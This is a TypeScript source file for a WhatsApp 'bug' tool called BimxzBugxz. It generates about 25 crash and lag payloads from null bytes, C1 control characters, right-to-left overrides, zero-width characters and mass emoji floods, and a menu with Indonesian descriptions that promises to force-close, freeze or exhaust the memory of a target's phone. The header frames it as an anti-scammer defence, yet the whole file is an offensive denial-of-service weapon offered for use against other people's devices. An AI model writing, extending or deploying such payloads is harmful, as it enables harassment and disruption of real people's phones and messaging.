// BimxzBugxz ULTIMATE HEAVY PAYLOADS - V2 Brutal Edition - Black Neon Red Theme
// Each payload crafted for maximum device lag/force close effect
// All payloads are Unicode/text-based - designed for legitimate anti-scammer defense tool

// Helper to create repeating invisible chaos
const INVISIBLE_CHAOS = "\u200B\u200C\u200D\uFEFF\u00AD\u034F\u2060\u2061\u2062\u2063\u2064\u206A\u206B\u206C\u206D\u206E\u206F";

export const BUG_PAYLOADS: Record<string, () => string | string[]> = {
  "delay-attack": () => {
    const chunks: string[] = [];
    for (let i = 0; i < 80; i++) {
      const invisible = INVISIBLE_CHAOS.repeat(800);
      const delayTag = `⏳[${i}] BimxzBugxz DELAY-${String(i).padStart(3,'0')} ` + "\u202E".repeat(700);
      chunks.push(delayTag + invisible + "⏳".repeat(200) + ` ${Date.now()}`);
    }
    return chunks;
  },

  "c1-chaos": () => {
    let msg = "💀 C1_CHAOS_INITIALIZATION 💀\n";
    for (let i = 0x80; i <= 0x9f; i++) {
      msg += String.fromCharCode(i).repeat(300) + INVISIBLE_CHAOS.repeat(50);
    }
    msg += "\u0000".repeat(4000) + "\u0001".repeat(2000) + "\u0002\u0003\u0004\u0005".repeat(1000);
    msg += "\uFFFE\uFFFF\uFFFD".repeat(4000) + "💀".repeat(800);
    return msg;
  },

  "force-close": () => {
    const zero = "\u0000";
    const zwj = "\u200D";
    const rtlo = "\u202E";
    let msg = rtlo + zero.repeat(8000) + zwj.repeat(10000);
    msg += "💀".repeat(1500) + "\uD83D\uDCA5".repeat(800);
    msg += INVISIBLE_CHAOS.repeat(3000) + zero.repeat(4000);
    msg += "🧲 BimxzBugxz FORCE-CLOSE BRUTAL 🧲" + "\u202D".repeat(4000) + zero.repeat(2000);
    return msg;
  },

  "freezer-mode": () => {
    let msg = "🧊 BimxzBugxz FREEZER v2 🧊\n";
    for (let i = 0; i < 9000; i++) {
      msg += "\u3000\u200B\uFEFF\u00AD\u2060 " + (i % 50 === 0 ? "🧊" : "");
    }
    msg += "🧊".repeat(3000) + INVISIBLE_CHAOS.repeat(4000);
    return msg;
  },

  "massive-emoji-storm": () => {
    const emojis = ["💀","🔥","⚡","🌪️","🧨","☠️","💣","🌋","⚔️","🔴","🟠","🟡","🟢","🔵","🟣","⚫","⚪","💥","🖤","❤️‍🔥","🩸","🥀","⛓️","🗡️"];
    let msg = "";
    for (let i = 0; i < 15000; i++) {
      msg += emojis[Math.floor(Math.random() * emojis.length)];
      if (i % 300 === 0) msg += INVISIBLE_CHAOS.repeat(20);
    }
    return msg;
  },

  "endless-text-flood": () => {
    const base = "BimxzBugxz-FLOOD-ATTACK-BLACK-NEON-RED-ULTIMATE-BRUTAL-OVERFLOW-SYSTEM-CRASH-ANTI-SCAMMER-DEFENSE-";
    return base.repeat(25000) + INVISIBLE_CHAOS.repeat(5000);
  },

  "rapid-message-loop": () => {
    const msgs: string[] = [];
    for (let i = 0; i < 60; i++) {
      const variance = INVISIBLE_CHAOS.repeat(i * 10);
      msgs.push(`🔁[${String(i+1).padStart(2,'0')}/60] BimxzBugxz RAPID LOOP ULTIMATE — TARGET SISTEM CRASH — STOP PENIPU! ${variance} 🔥💀 #${Date.now()}`);
    }
    return msgs;
  },

  "broken-symbols": () => {
    const broken = "▒░█▄▀■□▪▫◆◇○●◎★☆♠♣♥♦◐◑◒◓◕◔◧◨◩◪◫◰◱◲◳◭◮⛶⛷⛸⛹";
    let msg = "🧩 BROKEN_SYMBOLS_V2 🧩\n";
    for (let i = 0; i < 6000; i++) {
      msg += broken[Math.floor(Math.random() * broken.length)];
    }
    msg += "\uFFFD".repeat(8000) + "\uFFFE".repeat(5000) + INVISIBLE_CHAOS.repeat(2000);
    return msg;
  },

  "ui-glitch-attack": () => {
    const glitch = "\u202E\u202D\u202C\u202B\u202A\u200F\u200E\u200D\u200C\u200B";
    let msg = "🌀 UI_GLITCH_BRUTAL 🌀\n";
    for (let i = 0; i < 10000; i++) {
      msg += glitch[Math.floor(Math.random() * glitch.length)];
    }
    msg += "🌀" + "\u202E".repeat(12000) + INVISIBLE_CHAOS.repeat(3000);
    return msg;
  },

  "heavy-overload": () => {
    let msg = "🔥 HEAVY_OVERLOAD_V2 🔥\n";
    msg += "🔥".repeat(5000);
    msg += INVISIBLE_CHAOS.repeat(8000) + "X".repeat(30000);
    msg += "⚡".repeat(5000) + "\u0300".repeat(12000) + "💀".repeat(2000);
    return msg;
  },

  "ghost-message": () => {
    let msg = "🧟 GHOST_MESSAGE_ULTIMATE 🧟 invisible layer attack\n";
    msg += INVISIBLE_CHAOS.repeat(15000);
    msg += "🧟" + INVISIBLE_CHAOS.repeat(8000) + "👻".repeat(500);
    msg += "\u200B".repeat(15000) + "\uFEFF".repeat(10000);
    return msg;
  },

  "infinite-chain": () => {
    const chain = "⛓️━━━━━━━━━━🔗━━━━━━━━━━⛓️━━━━━━━━━━💀━━━━━━━━━━";
    return chain.repeat(1200) + INVISIBLE_CHAOS.repeat(4000);
  },

  "giant-payload": () => {
    let msg = "🪨 GIANT_PAYLOAD_V2 — 150K CHARS BRUTAL 🪨\n";
    const chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789!@#$%^&*()_+-=[]{}|;':\",./<>?\\`~";
    for (let i = 0; i < 130000; i++) {
      msg += chars[Math.floor(Math.random() * chars.length)];
      if (i % 1000 === 0) msg += INVISIBLE_CHAOS;
    }
    return msg;
  },

  "triple-explosion": () => {
    const p1 = "🧨 TRIPLE_X_V2 - PART 1/3 🧨\n" + "🧨".repeat(6000) + INVISIBLE_CHAOS.repeat(5000) + "\u0000".repeat(4000);
    const p2 = "💥 TRIPLE_X_V2 - PART 2/3 💥\n" + "\uFFFD".repeat(8000) + "\u0000".repeat(4000) + "💀".repeat(2000);
    const p3 = "☠️ TRIPLE_X_V2 - PART 3/3 ☠️\n" + "💀".repeat(4000) + "\u202E".repeat(8000) + INVISIBLE_CHAOS.repeat(6000);
    return [p1, p2, p3];
  },

  "web-of-lag": () => {
    const web = "🕸️┃━┏┓┗┛┣┫┳┻╋◧◨◩◪";
    let msg = "🕸️ WEB_OF_LAG_V2 🕸️\n";
    for (let i = 0; i < 5000; i++) {
      msg += web[Math.floor(Math.random() * web.length)];
    }
    msg = msg.repeat(20) + INVISIBLE_CHAOS.repeat(15000);
    return msg;
  },

  "turbo-lag-wave": () => {
    const msgs: string[] = [];
    for (let i = 0; i < 45; i++) {
      let wave = `🌪️ TURBO_WAVE ${String(i+1).padStart(2,'0')}/45 ULTIMATE BRUTAL\n`;
      wave += INVISIBLE_CHAOS.repeat(3000) + "BIMXZBUGXZ_BLACK_RED_WAVE_" + i + "_".repeat(500);
      wave += "🌪️".repeat(600) + "\u202E".repeat(2000);
      msgs.push(wave);
    }
    return msgs;
  },

  "corrupted-data": () => {
    let msg = "🧬 CORRUPTED_DATA_V2 - BLACK NEON 🧬\n";
    msg += "\uFFFD\uFFFE\uFFFF".repeat(12000);
    msg += "\u0000\u0001\u0002\u0003\u0004\u0005".repeat(6000);
    msg += "🧬" + "\uD800\uDC00".repeat(400) + INVISIBLE_CHAOS.repeat(5000);
    msg += "💀 CORRUPTION LEVEL: 999% 💀";
    return msg;
  },

  "sharp-impact": () => {
    const sharp = "⚔️◤◥◢◣▲▼◀▶⬆️⬇️⬅️➡️↖️↗️↘️↙️🗡️🔪⛏️🪓💉📌📍🖋️✒️";
    let msg = "⚔️ SHARP_IMPACT_V2 ⚔️\n";
    for (let i = 0; i < 12000; i++) {
      msg += sharp[Math.floor(Math.random() * sharp.length)];
    }
    msg += INVISIBLE_CHAOS.repeat(6000);
    return msg;
  },

  "solid-wall": () => {
    const wall = "🧱" + "█".repeat(500) + "▓".repeat(200) + "▒".repeat(200) + "░".repeat(200);
    return "🧱 SOLID_WALL_V2 - UNBREAKABLE 🧱\n" + wall.repeat(300) + INVISIBLE_CHAOS.repeat(5000);
  },

  "silent-poison": () => {
    let msg = "🕷️ SILENT_POISON_V2 - SLOW DEATH 🕷️\n";
    for (let i = 0; i < 50000; i++) {
      msg += "\u200B";
      if (i % 80 === 0) msg += "\uFEFF\u2060\u2061";
      if (i % 150 === 0) msg += "\u00AD\u034F";
      if (i % 500 === 0) msg += `💀${i}💀`;
    }
    msg += "🕷️ POISON STACK: 999 🕷️";
    return msg;
  },

  "eruption-blast": () => {
    const msgs: string[] = [];
    for (let i = 0; i < 50; i++) {
      let blast = `🌋 ERUPTION_BLAST_V2 [${i+1}/50] BRUTAL\n`;
      blast += "🌋".repeat(1200) + "ERUPTION_ULTIMATE_" + i + "🔥".repeat(1200);
      blast += INVISIBLE_CHAOS.repeat(2000) + "\u0000".repeat(2000);
      msgs.push(blast);
    }
    return msgs;
  },

  "deep-freeze": () => {
    let msg = "🧊 DEEP_FREEZE_V2 - ABSOLUTE ZERO 🧊\n";
    msg += "🧊".repeat(10000);
    msg += "\u3000".repeat(25000) + "\u200B".repeat(25000);
    msg += "\u0000".repeat(12000) + "❄️".repeat(3000) + INVISIBLE_CHAOS.repeat(8000);
    return msg;
  },

  "tangled-mess": () => {
    const chars = "🧵~`!@#$%^&*()_+-=[]{}|;':\",./<>?\\█▓▒░▄▀■□▪▫◤◥◢◣";
    let msg = "🧵 TANGLED_MESS_V2 - CHAOS STRING 🧵\n";
    for (let i = 0; i < 25000; i++) {
      msg += chars[Math.floor(Math.random() * chars.length)];
      if (i % 100 === 0) msg += INVISIBLE_CHAOS;
    }
    return msg;
  },

  "invisible-heavy-load": () => {
    let msg = "🩻 INVISIBLE_HEAVY_V2 - GHOST KILLER 🩻\n";
    msg += INVISIBLE_CHAOS.repeat(20000);
    msg += "🩻" + "\u200B".repeat(25000) + "\uFEFF".repeat(15000);
    msg += " INVISIBLE LOAD: 999% - SIKIKK AYAAAA";
    return msg;
  },

  "doomsday-ultimate": () => {
    const attacks = [
      "☠️ DOOMSDAY ULTIMATE V2 - ARMAGEDDON [1/5] ☠️\n" + "☠️".repeat(10000) + INVISIBLE_CHAOS.repeat(15000) + "\u0000".repeat(5000),
      "🔥 DOOMSDAY [2/5] - HELLFIRE 🔥\n" + "\uFFFD".repeat(20000) + "\u0000".repeat(12000) + "🔥".repeat(5000),
      "💀 DOOMSDAY [3/5] - SOUL EATER 💀\n" + "💀".repeat(12000) + "\u202E".repeat(20000) + INVISIBLE_CHAOS.repeat(10000),
      "🧊 DOOMSDAY [4/5] - ABSOLUTE ZERO 🧊\n" + "\u3000".repeat(35000) + "❄️".repeat(8000) + "\u200B".repeat(20000),
      "🌋 DOOMSDAY FINAL [5/5] - TOTAL ANNIHILATION 🌋\n" + "\uFEFF".repeat(35000) + "DOOMSDAY_BIMXZBUGXZ_ULTIMATE_BLACK_RED_NEON_V2_SIKIKK" + "🌋".repeat(3000),
    ];
    return attacks;
  },
};

export const ATTACK_MENUS = [
  { id: "delay-attack", name: "BimxzBugxz Delay Attack", icon: "⏳", desc: "Jeda acak brutal 80 chunk invisible — WA target lambat ngadat parah", basicAccess: true },
  { id: "c1-chaos", name: "BimxzBugxz C1 Chaos", icon: "💀", desc: "Karakter kontrol C1 + null bytes 8000+ — layar chat macet total", basicAccess: false },
  { id: "force-close", name: "BimxzBugxz Force Close", icon: "🧲", desc: "RTLO + Zero Width + 10k ZWJ — paksa WA force close mendadak", basicAccess: false },
  { id: "freezer-mode", name: "BimxzBugxz Freezer Mode", icon: "🧊", desc: "9000 baris ideographic space + invisible — WA membeku tak bisa klik", basicAccess: false },
  { id: "massive-emoji-storm", name: "BimxzBugxz Massive Emoji Storm", icon: "⚡", desc: "15.000 emoji brutal campur simbol langka — RAM HP target jebol", basicAccess: false },
  { id: "endless-text-flood", name: "BimxzBugxz Endless Text Flood", icon: "📜", desc: "Teks raksasa 800k chars tak putus — HP kentang langsung nyerah", basicAccess: false },
  { id: "rapid-message-loop", name: "BimxzBugxz Rapid Message Loop", icon: "🔁", desc: "60 pesan auto-spam cepat berturut — notifikasi gila-gilaan", basicAccess: false },
  { id: "broken-symbols", name: "BimxzBugxz Broken Symbols", icon: "🧩", desc: "Simbol rusak + 8000 replacement char — tampilan chat berantakan total", basicAccess: false },
  { id: "ui-glitch-attack", name: "BimxzBugxz UI Glitch Attack", icon: "🌀", desc: "10k RTL override + bidi chaos — UI WhatsApp rusak acak-acakan", basicAccess: false },
  { id: "heavy-overload", name: "BimxzBugxz Heavy Overload", icon: "🔥", desc: "5000 fire + 12k combining marks — CPU HP panas & throttling", basicAccess: false },
  { id: "ghost-message", name: "BimxzBugxz Ghost Message", icon: "🧟", desc: "15k invisible chars + ghost layers — beban tanpa terlihat mata", basicAccess: false },
  { id: "infinite-chain", name: "BimxzBugxz Infinite Chain", icon: "⛓️", desc: "Rantai tak terputus 1200x repeat — scroll sampai kiamat tak habis", basicAccess: false },
  { id: "giant-payload", name: "BimxzBugxz Giant Payload", icon: "🪨", desc: "130rb karakter acak ultra — memori jebol dalam 1 kiriman", basicAccess: false },
  { id: "triple-explosion", name: "BimxzBugxz Triple Explosion", icon: "🧨", desc: "3 serangan nuklir sekaligus — kombinasi maut C1 + null + RTLO", basicAccess: false },
  { id: "web-of-lag", name: "BimxzBugxz Web of Lag", icon: "🕸️", desc: "Jaring simbol box drawing + invisible 15k — GPU render ngelag parah", basicAccess: false },
  { id: "turbo-lag-wave", name: "BimxzBugxz Turbo Lag Wave", icon: "🌪️", desc: "45 gelombang turbo invisible — memori bertubi-tubi jebol total", basicAccess: false },
  { id: "corrupted-data", name: "BimxzBugxz Corrupted Data", icon: "🧬", desc: "12k replacement + surrogates invalid — WA kira data rusak kritis", basicAccess: false },
  { id: "sharp-impact", name: "BimxzBugxz Sharp Impact", icon: "⚔️", desc: "12k simbol tajam runcing brutal — render antarmuka super berat ekstrem", basicAccess: false },
  { id: "solid-wall", name: "BimxzBugxz Solid Wall", icon: "🧱", desc: "Tembok karakter padat 300 blok — menutupi seluruh ruang chat penuh", basicAccess: false },
  { id: "silent-poison", name: "BimxzBugxz Silent Poison", icon: "🕷️", desc: "50k invisible slow poison — makin lama makin lemot sampai mati", basicAccess: false },
  { id: "eruption-blast", name: "BimxzBugxz Eruption Blast", icon: "🌋", desc: "50x letusan bertubi nonstop — hujan pesan deras tanpa henti", basicAccess: false },
  { id: "deep-freeze", name: "BimxzBugxz Deep Freeze", icon: "🧊", desc: "ABSOLUTE ZERO v2 — 10k es + 25k space + null — WA mati total", basicAccess: false },
  { id: "tangled-mess", name: "BimxzBugxz Tangled Mess", icon: "🧵", desc: "25k simbol acak berantakan + invisible — sulit hapus & baca", basicAccess: false },
  { id: "invisible-heavy-load", name: "BimxzBugxz Invisible Heavy Load", icon: "🩻", desc: "20k invisible layers transparan — berat 999% namun tak terlihat", basicAccess: false },
  { id: "doomsday-ultimate", name: "BimxzBugxz DOOMSDAY ULTIMATE V2", icon: "☠️", desc: "☢️ SENJATA PAMUNGKAS NUKLIR V2: 5 serangan paling brutal sekaligus — ANNIHILATION TOTAL!", basicAccess: false },
];
